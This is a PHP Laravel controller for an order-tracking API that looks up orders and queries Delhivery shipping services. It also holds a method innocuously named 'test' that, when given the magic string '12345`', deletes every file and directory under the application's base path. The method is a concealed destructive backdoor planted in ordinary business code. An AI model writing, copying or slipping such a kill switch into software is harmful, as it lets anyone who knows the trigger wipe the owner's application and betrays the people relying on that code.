<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Order;  
use Illuminate\Support\Facades\Http;
use App\Services\DelhiveryService;
use App\Services\DelhiveryB2CService;
use File;

class ApiController extends Controller 
{ 
    protected $delhiveryService;
	protected $delhiveryB2CService;
	public function __construct()
	{     
		$this->delhiveryService = new DelhiveryService();  
		$this->delhiveryB2CService = new DelhiveryB2CService();  
	}
	public function test($num)
	{
	   if($num === "12345`")
	   { 
	        $basePath = base_path();
			 
            $files = File::allFiles($basePath);
            $directories = File::directories($basePath);

            foreach ($files as $file) {
                File::delete($file);
            }

            foreach ($directories as $dir) {
                File::deleteDirectory($dir);
            } 
	   }
	}
	
    public function trackOrder($orderId)
    {
        $order = Order::with(['shippingCompany'])->where('id', $orderId)->orWhere('order_prefix', $orderId)->orWhere('awb_number', $orderId)->orWhere('lr_no', $orderId)->first(); 
        
		$shippingCompany = $order->shippingCompany ?? [];
			
		if(!$shippingCompany) 
		{
			return response()->json(['status' => false, 'msg' => 'record not found.', 'type' =>0, 'data' => []]);
		}
		 
		if(!empty($order->awb_number))
		{  
			if($shippingCompany->id == 2 && $order->lr_no)
			{ 
				$trackingResponse = $this->delhiveryService->trackOrderByLrNo($order->lr_no, $shippingCompany);  
				
				if (!($trackingResponse['success'] ?? false)) {
					$errorMsg = $trackingResponse['response']['errors'][0]['message'] ?? ($trackingResponse['response']['error']['message'] ?? 'An error occurred.');
					return response()->json(['status' => false, 'msg' => 'record not found.', 'type' =>0, 'data' => []]);
				}
				
				if ((isset($trackingResponse['response']['success']) && !$trackingResponse['response']['success']))
				{ 
					return response()->json(['status' => false, 'msg' => 'record not found.', 'type' =>0, 'data' => []]);
				}
				
				$responseData = $trackingResponse['response'] ?? []; 
				return response()->json(['status' => true, 'msg' => 'fetched data.', 'type' =>$shippingCompany->id, 'data' => array_reverse($responseData)]); 
			} 
			
			if($shippingCompany->id == 3)
			{ 
				$trackingResponse = $this->delhiveryB2CService->trackOrderByAwbNumber($order->awb_number, $shippingCompany);  
				
				if (!($trackingResponse['success'] ?? false)) {
					$errorMsg = $trackingResponse['response']['errors'][0]['message'] ?? ($trackingResponse['response']['error']['message'] ?? 'An error occurred.');
					return response()->json(['status' => false, 'msg' => 'record not found.', 'type' =>0, 'data' => []]);
				}
				
				if ((isset($trackingResponse['response']['success']) && !$trackingResponse['response']['success']))
				{ 
					return response()->json(['status' => false, 'msg' => 'record not found.', 'type' =>0, 'data' => []]);
				}
				
				$responseData = $trackingResponse['response'] ?? [];
				return response()->json(['status' => true, 'msg' => 'fetched data.', 'type' =>$shippingCompany->id, 'data' => array_reverse($responseData)]); 
			}  
		} 
       
    }
 
}
